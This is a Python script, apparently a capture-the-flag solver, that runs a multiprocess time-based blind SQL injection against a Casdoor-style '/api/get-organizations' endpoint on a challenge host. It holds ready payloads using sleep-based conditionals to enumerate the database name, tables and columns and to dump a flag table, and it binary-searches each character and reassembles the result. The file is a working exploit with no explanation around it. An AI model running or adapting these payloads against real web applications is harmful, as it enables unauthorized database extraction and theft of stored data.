import ctypes
import multiprocessing
import random
import requests
import sys
import time
from os import system
from multiprocessing import *
from prettytable import PrettyTable
from rich.console import Console
from rich.highlighter import Highlighter


def stringlist(str):
    return int(str.split("^")[0])


def quick_sort(l1, first, last):
    if first < last:
        pivot_index = partition(l1, first, last)
        quick_sort(l1, first, pivot_index - 1)
        quick_sort(l1, pivot_index + 1, last)


def partition(l1, first, last):
    pivot_value = stringlist(l1[first])

    leftmark = first + 1
    rightmark = last

    done = False
    while not done:
        while leftmark <= rightmark and stringlist(l1[leftmark]) <= pivot_value:
            leftmark = leftmark + 1
        while stringlist(l1[rightmark]) >= pivot_value and rightmark >= leftmark:
            rightmark = rightmark - 1

        if rightmark < leftmark:
            done = True
        else:
            l1[leftmark], l1[rightmark] = l1[rightmark], l1[leftmark]
    l1[first], l1[rightmark] = l1[rightmark], l1[first]

    return rightmark


def logo() -> None:
    console0 = Console()

    class RainbowHighlighter(Highlighter):
        def highlight(self, text):
            for index in range(len(text)):
                text.stylize(f"color({random.randint(16, 255)})", index, index + 1)

    rainbow = RainbowHighlighter()
    console0.print(rainbow(''' 
██\            ████████\ ███████\  
\__|           \__██  __|██  __██\ 
██\ ███████\  ██\ ██ |   ██ |  ██ |
██ |██  __██\ \__|██ |   ███████  |
██ |██ |  ██ |██\ ██ |   ██  ____/ 
██ |██ |  ██ |██ |██ |   ██ |      
██ |██ |  ██ |██ |██ |   ██ |      
\__|\__|  \__|██ |\__|   \__|      
        ██\   ██ |                 
        \██████  |                 
         \______/                  '''))


def clear() -> None:
    system('cls')
    logo()


def ctrl_c(str2, start) -> None:
    while True:
        try:
            console = Console()
            name = str2
            table = PrettyTable(
                ['The blasting data is'])
            table.align = 'l'
            row = [name]
            table.add_row(row)
            if not name == '':
                clear()
                console.print(table)
                end = time.time()
                spend = end - start
                spend = int(spend)
                console.print("\n" + "[green][+]用时 -> " + str(spend) + "秒")
            else:
                raise Exception("异常")
            sys.exit()
        except Exception as e:
            print(e)
            break


def generate(q) -> None:
    for i in range(1, 100):
        q.put(i)


def booler_injection(url, q, q2, final_list, v) -> None:
    console = Console()
    while True:
        try:
            low = 32
            high = 128
            mid = (low + high) // 2
            i = q.get()
            while low < high:
                py_dict = {
                    'database': '''if(ascii(substr(database(),{0},1))>{1},sleep(2),1)''',
                    'tables': '''if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),{0},1)) > {1},sleep(2),0)''',
                    'columns': '''if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name = 0x666C6167),{0},1)) > {1},sleep(2),0)''',
                    'dump': '''if(ascii(mid((select group_concat(flag) from casdoor.flag),{0},1)) > {1},sleep(2),0)'''
                }
                payload_str = py_dict['dump'].format(i, mid)
                pld = url + payload_str
                req1 = requests.get(pld)
                # console.print(pld, end='\r')
                if req1.elapsed.total_seconds() > 2:
                    low = mid + 1  # 向右区间移动，增大
                else:
                    high = mid  # 向左区间移动，减小
                mid = (low + high) // 2
            if mid <= 32 or mid >= 127:
                q2.put(final_list)
                break
            final_list.append(str(i) + '^' + chr(mid))
            v.value = str(i)
            clear()
            console.print("[green][+]data is -> [/green]" + v.value)
        except Exception as y:
            console.print(y)
            break


if __name__ == '__main__':
    '''运行前修改URL,payload,判断依据'''
    final_list = multiprocessing.Manager().list()
    v = multiprocessing.Manager().Value(ctypes.c_char_p, '')  # 创建临界
    console = Console()
    start = time.time()
    q2 = Queue()
    q = Queue()
    url = "http://eci-2zeflliqex8bgumazibq.cloudeci1.ichunqiu.com:8000/api/get-organizations?p=1&pageSize=10&value=e99nb&sortField=&sortOrder=&field="
    process_list = []
    generate(q)
    for i in range(10):
        p = Process(target=booler_injection, args=(url, q, q2, final_list, v))
        p.start()
        process_list.append(p)
    for p in process_list:
        p.join()
    arr2 = q2.get()
    arr2 = list(filter(None, arr2))
    quick_sort(arr2, 0, len(arr2) - 1)
    for h in range(len(arr2)):
        str2 = arr2[h]
        str2 = str2.split("^")[1]
        arr2[h] = str2
    ctrl_c(''.join(arr2).replace(',', '\n'), start)
